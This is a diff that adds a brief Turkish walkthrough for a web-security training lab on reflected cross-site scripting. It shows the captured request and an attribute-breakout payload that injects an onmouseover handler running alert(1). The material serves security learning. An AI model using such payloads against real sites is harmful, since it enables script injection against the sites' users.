@@ -1,0 +1,7 @@
+LAB: Reflected XSS into attribute with angle brackets HTML-encoded
+
+1 - Herhangi bir sayı girerek aratın gelen isteği Burp Suite ile yakalayın.
+GET /?search=5 HTTP/1.1
+
+2 - Aşağıdakı payloadı göndererek imleci arama yerinin üzerine getirin. 
+GET /?search="onmouseover="alert(1) HTTP/1.1
